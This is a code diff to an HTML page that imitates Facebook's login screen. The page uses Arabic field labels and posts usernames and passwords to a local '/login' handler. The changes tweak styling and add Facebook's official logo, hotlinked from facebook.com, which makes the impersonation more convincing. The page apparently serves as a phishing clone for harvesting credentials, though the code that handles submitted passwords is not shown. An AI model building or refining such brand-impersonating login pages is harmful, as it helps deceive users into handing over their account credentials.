@@ -21,7 +21,7 @@
             padding: 40px;
             background-color: #ffffff;
             border-radius: 16px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 16px 32px rgba(0, 0, 0, 0.15);
             text-align: center;
             display: flex;
             flex-direction: column;
@@ -34,13 +34,21 @@
         .container:hover {
             transform: scale(1.02);
         }
+        .logo-wrapper {
+            margin-bottom: 20px;
+        }
         .logo {
+            width: 80px; /* Adjusted size */
+            margin-bottom: 10px;
+            filter: drop-shadow(0 1px 4px rgba(0, 0, 0, 0.2)); /* Refined shadow */
+        }
+        .logo-text {
             font-size: 50px;
             color: #1877f2;
             font-weight: 700;
             margin-bottom: 30px;
             letter-spacing: -0.5px;
-            text-shadow: 2px 2px 5px rgba(0,0,0,0.2);
+            text-shadow: 1px 1px 4px rgba(0,0,0,0.2);
         }
         input {
             width: calc(100% - 24px);
@@ -62,13 +70,6 @@
             box-shadow: 0 0 12px rgba(24, 119, 242, 0.5);
             outline: none;
             background-color: #ffffff;
-        }
-        .eye-icon {
-            position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            cursor: pointer;
         }
         button {
             width: calc(100% - 24px);
@@ -162,6 +163,10 @@
                 min-height: 560px;
             }
             .logo {
+                width: 60px; /* Adjusted size for mobile */
+                margin-bottom: 10px;
+            }
+            .logo-text {
                 font-size: 40px;
                 margin-bottom: 20px;
             }
@@ -181,7 +186,10 @@
 </head>
 <body>
     <div class="container">
-        <div class="logo">facebook</div>
+        <div class="logo-wrapper">
+            <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook Logo" class="logo">
+            <div class="logo-text">facebook</div>
+        </div>
         <form action="/login" method="POST">
             <input type="text" name="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
             <input type="password" name="password" placeholder="كلمة المرور" required>
